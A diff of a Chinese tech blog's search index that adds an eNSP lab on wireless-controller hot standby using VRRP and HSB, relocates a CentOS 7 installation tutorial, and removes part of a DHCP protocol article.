@@ -1,39 +1,560 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CentOS 7 安装教程</title>
-    <url>/posts/c734c1de/</url>
-    <content><![CDATA[<blockquote>
-<p> 已省略部分步骤</p>
-</blockquote>
-<br>
+    <title>AC双热机备份</title>
+    <url>/posts/50b45d5b/</url>
+    <content><![CDATA[<h2 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220615151950.png" alt="image-20220615151949929" loading="lazy"></p>
+<h2 id="LSW"><a href="#LSW" class="headerlink" title="LSW"></a>LSW</h2><p>交换机的配置</p>
+<pre class="language-none"><code class="language-none">sys
+sysname LuRen-SW
+vlan batch 10 to 14 801
+in g0&#x2F;0&#x2F;3
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 to 14
+in g0&#x2F;0&#x2F;4
+port link-type trunk
+port trunk pvid vlan 10
+port trunk allow-pass vlan 10 to 14
+in g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 to 14 801
+in g0&#x2F;0&#x2F;2
+port link-type trunk
+port trunk allow-pass vlan 10 to 14 801
+in vlan 801
+ip address 10.1.201.1 24 </code></pre>
 
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="先择语言"><a href="#先择语言" class="headerlink" title="先择语言"></a>先择语言</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104535.png" alt="1" loading="lazy"></p>
-<h3 id="调整时间，时区"><a href="#调整时间，时区" class="headerlink" title="调整时间，时区"></a>调整时间，时区</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104538.png" alt="2" loading="lazy"></p>
-<h3 id="选择预安装的软件"><a href="#选择预安装的软件" class="headerlink" title="选择预安装的软件"></a>选择预安装的软件</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104540.png" alt="3" loading="lazy"></p>
-<h3 id="配置分区"><a href="#配置分区" class="headerlink" title="配置分区"></a>配置分区</h3><p>如果嫌手动分区麻烦可选择自动分区，但这里我们手动配置。<br>选择我要配置分区，点击完成进入手动配置界面。<br>选择标准分区，点击 + 号添加分区，我们准备分3个区<br>&#x2F;boot（1G）：系统启动引导配置文件存放的区域，不需要太大<br>swap（4G）：交换分区，在系统的物理内存不够用的时候，把硬盘中的一部分空间释放出来，以供当前运行的程序使用，一般为物理内存大小的1.5-2倍<br>&#x2F;（95G）：根分区，将剩余全部大小作为根分区</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104542.png" alt="4" loading="lazy"></p>
-<p>点击完成，接收更改</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104544.png" alt="5" loading="lazy"></p>
-<h3 id="启用网络"><a href="#启用网络" class="headerlink" title="启用网络"></a>启用网络</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104552.png" alt="6" loading="lazy"></p>
-<h3 id="创建普通用户和密码"><a href="#创建普通用户和密码" class="headerlink" title="创建普通用户和密码"></a>创建普通用户和密码</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104555.png" alt="7" loading="lazy"></p>
-<h3 id="Cetos7安装完成"><a href="#Cetos7安装完成" class="headerlink" title="Cetos7安装完成"></a>Cetos7安装完成</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104558.png" alt="8" loading="lazy"></p>
-<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Centos7初次开机提示Initial setup of CentOS Linux 7</p>
-<p>开机后提示以下信息</p>
-<pre class="language-none"><code class="language-none">Initial setup of CentOS Linux 7 (core) 
-\1) [x] Creat user 2) [!] License information 
-(no user will be created) (license not accepted) 
-Please make your choice from above [‘q’ to quit | ‘c’ to continue | ‘r’ to refresh]:</code></pre>
+<p>配置各业务的网关</p>
+<pre class="language-none"><code class="language-none">in vlan 10
+ip address 10.1.10.1 24
+in vlan 11
+ip address 10.1.11.1 24
+in vlan 12
+ip address 10.1.12.1 24
+in vlan 13
+ip address 10.1.13.1 24
+in vlan 14
+ip address 10.1.14.1 24
+int LoopBack 0
+ip add 101.101.101.101 32 &#x2F;&#x2F;模拟公网</code></pre>
 
-<p>解决步骤如下：</p>
-<p>1，输入【1】，按Enter键同意许可协议，<br>2，输入【2】，按Enter键阅读许可协议，<br>3，输入【q】，按Enter键退出，<br>4，输入【yes】，按Enter键确定，<br>5，重启之后即可进入图形登录界面</p>
+
+
+
+
+
+
+
+
+<h2 id="AC1"><a href="#AC1" class="headerlink" title="AC1"></a>AC1</h2><p>AC1的基础配置</p>
+<pre class="language-none"><code class="language-none">sys
+sys LuRen-AC1
+vlan batch 10 to 14 801
+in g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 to 14 801
+in vlan 10
+ip add 10.1.10.100 24
+in vlan 11
+ip add 10.1.11.100 24
+in vlan 12
+ip add 10.1.12.100 24
+in vlan 13
+ip add 10.1.13.100 24
+in vlan 14
+ip add 10.1.14.100 24
+in vlan 801
+ip add 10.1.201.100 24
+
+</code></pre>
+
+<pre class="language-none"><code class="language-none">dis ip int brief</code></pre>
+
+<pre class="language-none"><code class="language-none">ip route-static 0.0.0.0 0.0.0.0 10.1.201.1
+ping 101.101.101.101</code></pre>
+
+<p>.创建AP组</p>
+<h2 id="ac1"><a href="#ac1" class="headerlink" title="ac1"></a>ac1</h2><pre class="language-none"><code class="language-none">wlan
+ap-group name ap-g1</code></pre>
+
+<h2 id="ac2"><a href="#ac2" class="headerlink" title="ac2"></a>ac2</h2><pre class="language-none"><code class="language-none">sys
+sys LuRen-AC2
+wlan
+ap-group name ap-g1</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="AC1-1"><a href="#AC1-1" class="headerlink" title="AC1"></a>AC1</h2><p>配置AP上线</p>
+<p>开启DHCP服务</p>
+<pre class="language-none"><code class="language-none">dhcp enable
+ip pool ap
+network 10.1.10.0 mask 24
+gateway-list 10.1.10.1
+option 43 sub-option 3 ascii 10.1.201.100
+in vlan 10
+dhcp select global
+quit
+ip pool sta1
+network 10.1.11.0 mask 24
+gateway-list 10.1.11.1
+ip pool sta2
+gateway-list 10.1.12.1
+network 10.1.12.0 mask 24
+ip pool sta3
+network 10.1.13.0 mask 24
+gateway-list 10.1.13.1
+ip pool sta4
+network 10.1.14.0 mask 24
+gateway-list 10.1.14.1
+in vlan 11
+dhcp select global
+in vlan 12
+dhcp select global
+in vlan 13
+dhcp select global
+in vlan 14
+dhcp select global
+quit</code></pre>
+
+<p>配置业务vlan pool：vlan分配算法为hash</p>
+<pre class="language-none"><code class="language-none">vlan pool sta-p1
+vlan 11 12
+assignment hash
+vlan pool sta-p2
+vlan 13 14
+assignment hash
+quit</code></pre>
+
+
+
+<p>配置域管理模板</p>
+<pre class="language-none"><code class="language-none">wlan
+regulatory-domain-profile name dom
+country-code cn
+quit
+quit
+capwap source interface Vlanif 801 
+</code></pre>
+
+<p>配置AP认证：MAC认证</p>
+<pre class="language-none"><code class="language-none">wlan
+ap auth-mode mac-auth
+ap-mac 00e0-fc72-3d60 ap-id 0
+ap-group ap-g1
+
+
+ap-name ap1
+ap-mac 00e0-fc97-2a40 ap-id 1
+ap-group ap-g1
+
+
+ap-name ap2
+dis ap all
+
+
+quit
+quit</code></pre>
+
+<p>AC1上配置WLAN业务</p>
+<p>创建安全模板，配置安全策略</p>
+<pre class="language-none"><code class="language-none">wlan
+security-profile name yw1
+security open
+security-profile name yw2
+security wpa2 psk pass-phrase 12345678 aes
+</code></pre>
+
+<p>创建SSID模板</p>
+<pre class="language-none"><code class="language-none">quit
+ssid-profile name yw1
+ssid yw1
+ssid-profile name yw2
+ssid yw2
+</code></pre>
+
+<p>创建vap模板，并引用安全和SSID模板</p>
+<pre class="language-none"><code class="language-none">quit
+vap-profile name yw1
+forward-mode tunnel
+service-vlan vlan-pool sta-p1
+security-profile yw1
+ssid-profile yw1
+vap-profile name yw2
+forward-mode direct-forward
+service-vlan vlan-pool sta-p2
+security-profile yw2
+ssid-profile yw2
+</code></pre>
+
+<p>AP组引用域管理模板和vap模板</p>
+<pre class="language-none"><code class="language-none">quit
+ap-group name ap-g1
+regulatory-domain-profile dom
+
+
+
+vap-profile yw1 wlan 1 radio all
+vap-profile yw2 wlan 2 radio all
+</code></pre>
+
+<p>查看vap状态</p>
+<pre class="language-none"><code class="language-none">dis vap ssid yw1
+dis vap ssid yw2
+
+
+quit
+quit</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="AC2"><a href="#AC2" class="headerlink" title="AC2"></a>AC2</h2><p>.配置备用LuRen-AC2的基础</p>
+<pre class="language-none"><code class="language-none">vlan batch 10 to 14 801
+in g0&#x2F;0&#x2F;1
+port link-type trunk
+port trunk allow-pass vlan 10 to 14 801
+in vlan 10
+ip add 10.1.10.200 24
+in vlan 11
+ip add 10.1.11.200 24
+in vlan 12
+ip add 10.1.12.200 24
+in vlan 13
+ip add 10.1.13.200 24
+in vlan 14
+ip add 10.1.14.200 24
+in vlan 801
+ip add 10.1.201.200 24
+dis ip int brief
+
+
+quit
+ip route-static 0.0.0.0 0.0.0.0 10.1.201.1</code></pre>
+
+<p>创建AP组</p>
+<pre class="language-none"><code class="language-none">wlan
+ap-group name ap-g1
+quit
+quit </code></pre>
+
+
+
+<p>开启DHCP服务</p>
+<pre class="language-none"><code class="language-none">dhcp enable
+ip pool ap
+network 10.1.10.0 mask 24
+gateway-list 10.1.10.1
+option 43 sub-option 3 ascii 10.1.201.100
+in vlan 10
+dhcp select global
+quit
+ip pool sta1
+network 10.1.11.0 mask 24
+gateway-list 10.1.11.1
+ip pool sta2
+network 10.1.12.0 mask 24
+gateway-list 10.1.12.1
+ip pool sta3
+network 10.1.13.0 mask 24
+gateway-list 10.1.13.1
+ip pool sta4
+network 10.1.14.0 mask 24
+gateway-list 10.1.14.1
+quit</code></pre>
+
+<p>使vlanif接口能DHCP功能</p>
+<pre class="language-none"><code class="language-none">in vlan 11
+dhcp select global
+in vlan 12
+dhcp select global
+in vlan 13
+dhcp select global
+in vlan 14
+dhcp select global
+quit</code></pre>
+
+<p>配置vlan pool，用于业务vlan</p>
+<pre class="language-none"><code class="language-none">vlan pool sta-p1
+vlan 11 12
+assignment hash
+vlan pool sta-p2
+vlan 13 14
+assignment hash
+</code></pre>
+
+<p>配置LuRen-AC2域管理模板</p>
+<pre class="language-none"><code class="language-none">quit
+wlan
+regulatory-domain-profile name dom
+country-code cn
+</code></pre>
+
+<p>配置LuRen-AC2的源接口</p>
+<pre class="language-none"><code class="language-none">quit
+quit
+capwap source interface Vlanif 801</code></pre>
+
+<p>配置LuRen-AC2的AP认证</p>
+<pre class="language-none"><code class="language-none">wlan
+ap auth-mode mac-auth
+ap-mac 00e0-fc72-3d60 ap-id 0
+ap-group ap-g1
+
+ap-name ap1
+ap-mac 00e0-fc97-2a40  ap-id 1
+ap-name ap2
+ap-group ap-g1
+</code></pre>
+
+<p>10.LuRen-AC2上配置WLAN业务参数</p>
+<p>创建安全模板，配置安全策略</p>
+<pre class="language-none"><code class="language-none">quit
+quit
+wlan
+security-profile name yw1
+security open
+security-profile name yw2
+security wpa2 psk pass-phrase 12345678 aes
+</code></pre>
+
+<p>创建ssid模板</p>
+<pre class="language-none"><code class="language-none">quit
+ssid-profile name yw1
+ssid yw1
+ssid-profile name yw2
+ssid yw2
+</code></pre>
+
+<p>创建VAP模板，转发模式为直接转发，引用安全和ssid模板</p>
+<pre class="language-none"><code class="language-none">quit
+vap-profile name yw1
+forward-mode tunnel
+service-vlan vlan-pool sta-p1
+security-profile yw1
+ssid-profile yw1
+vap-profile name yw2
+forward-mode direct-forward
+service-vlan vlan-pool sta-p2
+security-profile yw2
+ssid-profile yw2
+</code></pre>
+
+
+
+<p>AP组引用管理模板和VAP模板</p>
+<pre class="language-none"><code class="language-none">quit
+ap-group name ap-g1
+regulatory-domain-profile dom
+
+
+vap-profile yw1 wlan 1 radio all
+vap-profile yw2 wlan 2 radio all
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="AC1-2"><a href="#AC1-2" class="headerlink" title="AC1"></a>AC1</h2><p>11.在主LuRen-AC1上配置VRRP实现双机热备份</p>
+<p>创建管理vrrp备份组，优先级为120，抢占时间为120秒</p>
+<pre class="language-none"><code class="language-none">int Vlanif 801
+vrrp vrid 1 virtual-ip 10.1.201.3
+vrrp vrid 1 priority 120
+vrrp vrid 1 preempt-mode timer delay 120
+admin-vrrp vrid 1
+quit</code></pre>
+
+<p>创建业务vrrp备份组</p>
+<pre class="language-none"><code class="language-none">int Vlanif 10
+vrrp vrid 2 virtual-ip 10.1.10.3
+vrrp vrid 2 preempt-mode timer delay 120
+vrrp vrid 2 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 11
+vrrp vrid 3 virtual-ip 10.1.11.3
+vrrp vrid 3 preempt-mode timer delay 120
+vrrp vrid 3 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 12
+vrrp vrid 4 virtual-ip 10.1.12.3
+vrrp vrid 4 preempt-mode timer delay 120
+vrrp vrid 4 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 13
+vrrp vrid 5 virtual-ip 10.1.13.3
+vrrp vrid 5 preempt-mode timer delay 120
+vrrp vrid 5 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 14
+vrrp vrid 6 virtual-ip 10.1.14.3
+vrrp vrid 6 preempt-mode timer delay 120
+vrrp vrid 6 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+</code></pre>
+
+<p>配置VRRP备份组的状态恢复延迟时间为30秒</p>
+<pre class="language-none"><code class="language-none">vrrp recover-delay 30</code></pre>
+
+<p>创建HSB主备服务0：配置主备通道IP地址和端口号，报文重传次数和发送间隔</p>
+<pre class="language-none"><code class="language-none">hsb-service 0
+service-ip-port local-ip 10.1.201.100 peer-ip 10.1.201.200 local-data-port 10241 peer-data-port 10241
+service-keep-alive detect retransmit 2 interval 1
+</code></pre>
+
+<p>创建HSB备份组0，邦迪HSB主备服务0和管理vrrp备份组</p>
+<pre class="language-none"><code class="language-none">hsb-group 0
+
+bind-service 0
+
+track vrrp vrid 1 interface Vlanif 801</code></pre>
+
+
+
+
+
+
+
+<p>配置NAC业务绑定HSB备份组</p>
+<pre class="language-none"><code class="language-none">quit
+hsb-service-type access-user hsb-group 0</code></pre>
+
+
+
+<p>配置wlan业务绑定HSB备份组</p>
+<pre class="language-none"><code class="language-none">hsb-service-type ap hsb-group 0</code></pre>
+
+<p>使能双机热备功能</p>
+<pre class="language-none"><code class="language-none">hsb-group 0
+hsb enable
+quit</code></pre>
+
+<p>更改AC1源接口</p>
+<pre class="language-none"><code class="language-none">undo capwap source interface Vlanif 801
+capwap source ip-address 10.1.201.3</code></pre>
+
+<p>配置dhcp服务器的option 43字段</p>
+<pre class="language-none"><code class="language-none">dhcp server database enable
+dhcp server database recover
+ip pool ap
+option 43 sub-option 3 ascii 10.1.201.3</code></pre>
+
+
+
+
+
+
+
+
+
+<h2 id="AC2-1"><a href="#AC2-1" class="headerlink" title="AC2"></a>AC2</h2><p>12.备用LuRen-AC2的配置</p>
+<p>创建管理vrrp备份组</p>
+<pre class="language-none"><code class="language-none">int Vlanif 801
+vrrp vrid 1 virtual-ip 10.1.201.3
+admin-vrrp vrid 1
+</code></pre>
+
+<p>创建业务vlan备份组</p>
+<pre class="language-none"><code class="language-none">int Vlanif 10
+vrrp vrid 2 virtual-ip 10.1.10.3
+vrrp vrid 2 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 11
+vrrp vrid 3 virtual-ip 10.1.11.3
+vrrp vrid 3 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 12
+vrrp vrid 4 virtual-ip 10.1.12.3
+vrrp vrid 4 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 13
+vrrp vrid 5 virtual-ip 10.1.13.3
+vrrp vrid 5 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+int Vlanif 14
+vrrp vrid 6 virtual-ip 10.1.14.3
+vrrp vrid 6 track admin-vrrp interface Vlanif 801 vrid 1 unflowdown
+quit</code></pre>
+
+<p>配置备份组状态恢复延迟为30秒</p>
+<pre class="language-none"><code class="language-none">vrrp recover-delay 30</code></pre>
+
+<p>创建HSB主备服务0</p>
+<pre class="language-none"><code class="language-none">hsb-service 0
+service-ip-port local-ip 10.1.201.200 peer-ip 10.1.201.100 local-data-port 10241 peer-data-port 10241
+service-keep-alive detect retransmit 2 interval 1
+quit</code></pre>
+
+<p>创建HSB备份服务组0，绑定HSB主备服务0和管理vrrp备份组</p>
+<pre class="language-none"><code class="language-none">hsb-group 0
+bind-service 0
+track vrrp vrid 1 interface Vlanif 801
+</code></pre>
+
+<p>配置NAC业务绑定HSB备份组</p>
+<pre class="language-none"><code class="language-none">hsb-service-type access-user hsb-group 0</code></pre>
+
+
+
+<p>配置WLAN业务绑定HSB备份组</p>
+<pre class="language-none"><code class="language-none">hsb-service-type ap hsb-group 0</code></pre>
+
+
+
+<p>配置dhcp业务绑定备份组</p>
+<pre class="language-none"><code class="language-none">hsb-service-type dhcp hsb-group 0</code></pre>
+
+
+
+<p>使能双机热备功能</p>
+<pre class="language-none"><code class="language-none">hsb-group 0
+hsb enable
+quit</code></pre>
+
+<p>更改AC2的源接口</p>
+<pre class="language-none"><code class="language-none">undo capwap source interface Vlanif 801
+
+capwap source ip-address 10.1.201.3
+</code></pre>
+
+<p>修改DHCP服务器的option 43字段</p>
+<pre class="language-none"><code class="language-none">dhcp server database enable
+dhcp server database recover
+ip pool ap
+option 43 sub-option 3 ascii 10.1.201.3
+</code></pre>
 ]]></content>
       <categories>
-        <category>教程</category>
-        <category>Linux</category>
+        <category>学习</category>
+        <category>eNSP</category>
+        <category>WLAN和安全</category>
       </categories>
       <tags>
-        <tag>CentOS7</tag>
+        <tag>eNSP</tag>
       </tags>
   </entry>
   <entry>
@@ -131,6 +652,42 @@ Please make your choice from above [‘q’ to quit | ‘c’ to continue | ‘r
       </tags>
   </entry>
   <entry>
+    <title>CentOS 7 安装教程</title>
+    <url>/posts/c734c1de/</url>
+    <content><![CDATA[<blockquote>
+<p> 已省略部分步骤</p>
+</blockquote>
+<br>
+
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="先择语言"><a href="#先择语言" class="headerlink" title="先择语言"></a>先择语言</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104535.png" alt="1" loading="lazy"></p>
+<h3 id="调整时间，时区"><a href="#调整时间，时区" class="headerlink" title="调整时间，时区"></a>调整时间，时区</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104538.png" alt="2" loading="lazy"></p>
+<h3 id="选择预安装的软件"><a href="#选择预安装的软件" class="headerlink" title="选择预安装的软件"></a>选择预安装的软件</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104540.png" alt="3" loading="lazy"></p>
+<h3 id="配置分区"><a href="#配置分区" class="headerlink" title="配置分区"></a>配置分区</h3><p>如果嫌手动分区麻烦可选择自动分区，但这里我们手动配置。<br>选择我要配置分区，点击完成进入手动配置界面。<br>选择标准分区，点击 + 号添加分区，我们准备分3个区<br>&#x2F;boot（1G）：系统启动引导配置文件存放的区域，不需要太大<br>swap（4G）：交换分区，在系统的物理内存不够用的时候，把硬盘中的一部分空间释放出来，以供当前运行的程序使用，一般为物理内存大小的1.5-2倍<br>&#x2F;（95G）：根分区，将剩余全部大小作为根分区</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104542.png" alt="4" loading="lazy"></p>
+<p>点击完成，接收更改</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104544.png" alt="5" loading="lazy"></p>
+<h3 id="启用网络"><a href="#启用网络" class="headerlink" title="启用网络"></a>启用网络</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104552.png" alt="6" loading="lazy"></p>
+<h3 id="创建普通用户和密码"><a href="#创建普通用户和密码" class="headerlink" title="创建普通用户和密码"></a>创建普通用户和密码</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104555.png" alt="7" loading="lazy"></p>
+<h3 id="Cetos7安装完成"><a href="#Cetos7安装完成" class="headerlink" title="Cetos7安装完成"></a>Cetos7安装完成</h3><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Centos7%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/20220502104558.png" alt="8" loading="lazy"></p>
+<h2 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h2><p>Centos7初次开机提示Initial setup of CentOS Linux 7</p>
+<p>开机后提示以下信息</p>
+<pre class="language-none"><code class="language-none">Initial setup of CentOS Linux 7 (core) 
+\1) [x] Creat user 2) [!] License information 
+(no user will be created) (license not accepted) 
+Please make your choice from above [‘q’ to quit | ‘c’ to continue | ‘r’ to refresh]:</code></pre>
+
+<p>解决步骤如下：</p>
+<p>1，输入【1】，按Enter键同意许可协议，<br>2，输入【2】，按Enter键阅读许可协议，<br>3，输入【q】，按Enter键退出，<br>4，输入【yes】，按Enter键确定，<br>5，重启之后即可进入图形登录界面</p>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>CentOS7</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CentOS7加密grub</title>
     <url>/posts/71556fb/</url>
     <content><![CDATA[<ol>
@@ -175,166 +732,6 @@ password_pbkdf2 root +刚刚复制的哈希密码&#96;&#96;&#96;</code></pre>
       </categories>
       <tags>
         <tag>CentOS7</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DHCP协议原理与应用</title>
-    <url>/posts/ca4e8c36/</url>
-    <content><![CDATA[<div class="danger">
-
-<blockquote>
-<p> 资料来源<a href="https://talent.ruijie.com.cn/certification/profession/">锐捷</a><br> 非原创</p>
-</blockquote>
-</div>
-
-
-
-<h1 id="DHCP协议原理与应用"><a href="#DHCP协议原理与应用" class="headerlink" title="DHCP协议原理与应用"></a>DHCP协议原理与应用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）通常被应用在大型的局域网络环 境中，主要作用是集中的管理、分配IP地址，使网络环境中的主机动态的获得IP地址、Gateway地址、 DNS服务器地址等信息，并能够提升地址的使用率。</p>
-<h2 id="DHCP协议概述"><a href="#DHCP协议概述" class="headerlink" title="DHCP协议概述"></a>DHCP协议概述</h2><p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105615.png" alt="7" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105617.png" alt="8" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105619.png" alt="9" loading="lazy"></p>
-<h2 id="DHCP协议工作原理"><a href="#DHCP协议工作原理" class="headerlink" title="DHCP协议工作原理"></a>DHCP协议工作原理</h2><p>DHCP简介</p>
-<ul>
-<li>DHCP（Dynamic Host Configuration Protocol），动态主机配置协议</li>
-<li>定义在RFC2131中， C&#x2F;S架构，为终端设备提供TCP&#x2F;IP参数（IP地址、掩码、网关、DNS等）的自动配置。</li>
-<li>DHCP报文格式和BootP（RFC951、RFC1542）报文兼容，保证了互操作</li>
-</ul>
-<h2 id="DHCP协议名词解释"><a href="#DHCP协议名词解释" class="headerlink" title="DHCP协议名词解释"></a>DHCP协议名词解释</h2><ul>
-<li>DHCP Client <ul>
-<li>DHCP客户机，即用户终端设备，可以是手机、电脑、打印机等需要接入网络的终端设备</li>
-</ul>
-</li>
-<li>DHCP Server <ul>
-<li>DHCP服务器，为终端分配网络参数，管理地址池</li>
-</ul>
-</li>
-</ul>
-<p>DHCP服务器配置</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105621.png" alt="10" loading="lazy"></p>
-<p>PC的DHCP设置</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105624.png" alt="11" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105626.png" alt="12" loading="lazy"></p>
-<p>DHCP协议工作过程</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105627.png" alt="13" loading="lazy"></p>
-<p>DHCP协议报文及用途</p>
-<table>
-<thead>
-<tr>
-<th>报文类型</th>
-<th>用途</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>DHCP discover</td>
-<td>客户端广播查找可用服务器</td>
-</tr>
-<tr>
-<td>DHCP offer</td>
-<td>服务器响应DHCP discover报文，分配相应配置参数</td>
-</tr>
-<tr>
-<td>DHCP request</td>
-<td>客户端请求配置参数、请求配置确认、续租约</td>
-</tr>
-<tr>
-<td>DHCP ack</td>
-<td>服务器确认DHCP request报文</td>
-</tr>
-<tr>
-<td>DHCP decline</td>
-<td>客户端发现地址被使用时，通知服务器</td>
-</tr>
-<tr>
-<td>DHCP release</td>
-<td>客户端释放地址时通知服务器的报文</td>
-</tr>
-<tr>
-<td>DHCP inform</td>
-<td>客户端已有IP地址，请求更详细配置参数</td>
-</tr>
-<tr>
-<td>DHCP nak</td>
-<td>服务器告诉客户端地址请求不正确或租期已过期</td>
-</tr>
-</tbody></table>
-<p>DHCP协议报文及用途</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105631.png" alt="14" loading="lazy"></p>
-<p>DHCP报文介绍 —— DHCP Offer</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105632.png" alt="15" loading="lazy"></p>
-<p>DHCP报文介绍 —— DHCP Request</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105633.png" alt="16" loading="lazy"></p>
-<p>DHCP报文介绍 —— DHCP Ack</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105635.png" alt="17" loading="lazy"></p>
-<p>DHCP协议的租约</p>
-<ul>
-<li>租约50%时刻<ul>
-<li>客户端主动向服务器发送DHCP request报文，请求更新租约时间； <ul>
-<li>若服务器可用，回复DHCP ack，更新租约； </li>
-<li>若服务器不可用，回复DHCP nak，不更新租约；</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>租约87.5%时刻 <ul>
-<li>客户端主动向服务器发送DHCP request报文，请求更新租约时间； <ul>
-<li>若服务器可用，回复DHCP ack，更新租约； </li>
-<li>若服务器不可用，回复DHCP nak，不更新租约；</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>待到租约时间过去，客户端会重新发送DHCP discover报文。</li>
-</ul>
-<h3 id="DHCP常见部署方式"><a href="#DHCP常见部署方式" class="headerlink" title="DHCP常见部署方式"></a>DHCP常见部署方式</h3><p>校园网中常见的DHCP服务部署方式</p>
-<ul>
-<li>方式一：网关交换机作为DHCP服务器 <ul>
-<li>优势：节省一台服务器资源 </li>
-<li>劣势：地址池配置分散在网络中多台汇聚网关交换机上，无法集中管理</li>
-</ul>
-</li>
-<li>方式二：网关交换机作为DHCP中继，在服务器区部署一台专用的DHCP服务器<ul>
-<li>优势：集中管理，不需要每一个网段都配置一个DHCP服务器，节约资源 </li>
-<li>劣势：需要占用一台服务器资源</li>
-</ul>
-</li>
-</ul>
-<p>方式一：网关交换机作为DHCP服务器</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105637.png" alt="18" loading="lazy"></p>
-<p>方式二：部署专用DHCP服务器</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Ruijie/20220607105640.png" alt="19" loading="lazy"></p>
-<p>DHCP相关安全设计</p>
-<ul>
-<li>用户使用静态IP地址接入<ul>
